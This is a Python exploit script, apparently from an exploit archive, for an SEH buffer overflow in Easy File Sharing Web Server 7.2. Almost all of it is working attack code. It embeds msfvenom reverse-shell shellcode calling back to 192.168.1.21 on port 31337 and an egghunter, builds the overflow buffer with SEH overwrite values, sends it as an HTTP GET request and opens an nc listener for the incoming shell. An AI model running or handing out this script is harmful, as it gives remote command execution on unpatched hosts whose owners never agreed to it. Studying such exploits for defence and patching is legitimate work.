#!/usr/bin/env python
import sys
import socket
import struct
import subprocess

#----------------------------------------------------------------------------------#
# Exploit: Easy File Sharing Web Server 7.2 SEH Buffer Overflow (egghunter)        #
# OS Tested: XP PRO SP3 (Professional); Windows 7 SP1                              #
# Author: Amonsec                                                                  #
# Software: https://www.exploit-db.com/apps/                                       #
#                   60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe                  #
#----------------------------------------------------------------------------------#
# Gratz:                                                                           #
#       Corelan    (https://www.corelan.be/)                                       #
#       b33f       (https://www.fuzzysecurity.com/)                                #
#       Ch3rn0byl  (http://ch3rn0byl.com/)                                         #
#----------------------------------------------------------------------------------#
if len(sys.argv) < 3:
	print '[*] Easy File Sharing v7.2 exploit'
	print '[*] Usage: {} <ip addr> <port>'.format(sys.argv[0])
	sys.exit(1)
else:
	rhost = sys.argv[1]
	rport = int(sys.argv[2])
	
#-------------------------------------------------------------------------------------------------------------------------------------------------------------#
# msfvenom --platform windows -p windows/shell_reverse_tcp LPORT=31337 LHOST=192.168.1.21 -a x86 -n 20 -f python -v shellcode -b '\x00\x20\x25\x2b\x2f\x5c' #
#-------------------------------------------------------------------------------------------------------------------------------------------------------------#

shellcode =  ""
shellcode += "\x49\x9b\x48\x4a\x4a\x41\x4a\x49\x9f\x91\x40"
shellcode += "\x98\x4b\x42\x90\x43\x4a\x3f\xf9\x43\xda\xcf"
shellcode += "\xbe\x1f\xbf\x92\x24\xd9\x74\x24\xf4\x5d\x29"
shellcode += "\xc9\xb1\x52\x83\xc5\x04\x31\x75\x13\x03\x6a"
shellcode += "\xac\x70\xd1\x68\x3a\xf6\x1a\x90\xbb\x97\x93"
shellcode += "\x75\x8a\x97\xc0\xfe\xbd\x27\x82\x52\x32\xc3"
shellcode += "\xc6\x46\xc1\xa1\xce\x69\x62\x0f\x29\x44\x73"
shellcode += "\x3c\x09\xc7\xf7\x3f\x5e\x27\xc9\x8f\x93\x26"
shellcode += "\x0e\xed\x5e\x7a\xc7\x79\xcc\x6a\x6c\x37\xcd"
shellcode += "\x01\x3e\xd9\x55\xf6\xf7\xd8\x74\xa9\x8c\x82"
shellcode += "\x56\x48\x40\xbf\xde\x52\x85\xfa\xa9\xe9\x7d"
shellcode += "\x70\x28\x3b\x4c\x79\x87\x02\x60\x88\xd9\x43"
shellcode += "\x47\x73\xac\xbd\xbb\x0e\xb7\x7a\xc1\xd4\x32"
shellcode += "\x98\x61\x9e\xe5\x44\x93\x73\x73\x0f\x9f\x38"
shellcode += "\xf7\x57\xbc\xbf\xd4\xec\xb8\x34\xdb\x22\x49"
shellcode += "\x0e\xf8\xe6\x11\xd4\x61\xbf\xff\xbb\x9e\xdf"
shellcode += "\x5f\x63\x3b\x94\x72\x70\x36\xf7\x1a\xb5\x7b"
shellcode += "\x07\xdb\xd1\x0c\x74\xe9\x7e\xa7\x12\x41\xf6"
shellcode += "\x61\xe5\xa6\x2d\xd5\x79\x59\xce\x26\x50\x9e"
shellcode += "\x9a\x76\xca\x37\xa3\x1c\x0a\xb7\x76\xb2\x5a"
shellcode += "\x17\x29\x73\x0a\xd7\x99\x1b\x40\xd8\xc6\x3c"
shellcode += "\x6b\x32\x6f\xd6\x96\xd5\x50\x8f\x99\x30\x39"
shellcode += "\xd2\x99\x40\xd0\x5b\x7f\xde\x32\x0a\x28\x77"
shellcode += "\xaa\x17\xa2\xe6\x33\x82\xcf\x29\xbf\x21\x30"
shellcode += "\xe7\x48\x4f\x22\x90\xb8\x1a\x18\x37\xc6\xb0"
shellcode += "\x34\xdb\x55\x5f\xc4\x92\x45\xc8\x93\xf3\xb8"
shellcode += "\x01\x71\xee\xe3\xbb\x67\xf3\x72\x83\x23\x28"
shellcode += "\x47\x0a\xaa\xbd\xf3\x28\xbc\x7b\xfb\x74\xe8"
shellcode += "\xd3\xaa\x22\x46\x92\x04\x85\x30\x4c\xfa\x4f"
shellcode += "\xd4\x09\x30\x50\xa2\x15\x1d\x26\x4a\xa7\xc8"
shellcode += "\x7f\x75\x08\x9d\x77\x0e\x74\x3d\x77\xc5\x3c"
shellcode += "\x4d\x32\x47\x14\xc6\x9b\x12\x24\x8b\x1b\xc9"
shellcode += "\x6b\xb2\x9f\xfb\x13\x41\xbf\x8e\x16\x0d\x07"
shellcode += "\x63\x6b\x1e\xe2\x83\xd8\x1f\x27"


#--------------------------------------------------------------------------------------------------------#
# (*) Badchars = '\x00\x20\x25\x2b\x2f\x5c'                                                              #
#                                                                                                        #
# (*) Crash to nseh 4061-bytes                                                                           #
# (*) shellcode space = 2000                                                                             #
#--------------------------------------------------------------------------------------------------------#
# (0) 2000 'A' character                                                                                 #
# (1) Marker 'hivehive'                                                                                  #
# (2) 20 NOPs + shellcode                                                                                #
# (3) 1641 NOPs                                                                                          #
# (4) Egghunter; marker 'hive'                                                                           #
# (5) 16 NOPs                                                                                            #
# (6) nseh = '\xeb\x06\x90\x90'                                                                          #
# (7) seh = '\x1e\x40\x20\x12'	pop pop ret | [ImageLoad.dll]                                            #
# (8) JMP SHORT -60 => \xeb\xc4                                                                          #
# (9) 1429 NOPs                                                                                          #
#--------------------------------------------------------------------------------------------------------#
# Exploit Structure:                                                                                     #
#                                                                                                        #
#                                                             +---------------->                         #
#    [AA..AA] [NOPs + shellcode] [NOPs] [egghunter] [NOPs]   [nseh]   [seh]   [\xeb\xc4] [NOPs]          #
#     +---------------------------------------------------------------->  |           |                  #
#              ^                         ^       |               <--------+           |                  #
#              |                         |-------|------------------------------------+                  #
#              +---------------------------------+                                                       #
#                                                                                                        #
#--------------------------------------------------------------------------------------------------------#
egghunter = ''
egghunter += '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c'
egghunter += '\x05\x5a\x74\xef\xb8\x68\x69\x76\x65\x8b\xfa\xaf\x75'
egghunter += '\xea\xaf\x75\xe7\xff\xe7'

buffer = ''
buffer += '\x41' * 2000
buffer += 'hivehive' 
buffer += '\x90' * 20
buffer += shellcode
buffer += '\x90' * (4013 - 2000 - 8 -20 - len(shellcode))
buffer += egghunter
buffer += '\x90' * 16
buffer += struct.pack('<L', 0x909006eb)
buffer += struct.pack('<L', 0x100194b2)
buffer += '\xeb\xc4'
buffer += '\x90' * (5500 - 4061 - 8 - 2)

payload = 'GET {} HTTP/1.0\r\n\r\n'.format(buffer)

try:
	print '[*] Easy File Sharing Web Server 7.2 SEH Buffer Overflow (egghunter)'
	print '[*] Target: {}:{}'.format(rhost, rport)

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((rhost, rport))
	print '[*] Connection established'

	print '[*] Send exploit: {} bytes'.format(len(buffer))
	s.send(payload)
	s.close

	print "\n[*] Brrrrrraaaaah! Time for a shell?! huhg"
	subprocess.call(['nc -lnvvp 31337'], shell=True)

except:
	print "[-] Host unreachable"
	sys.exit(1)
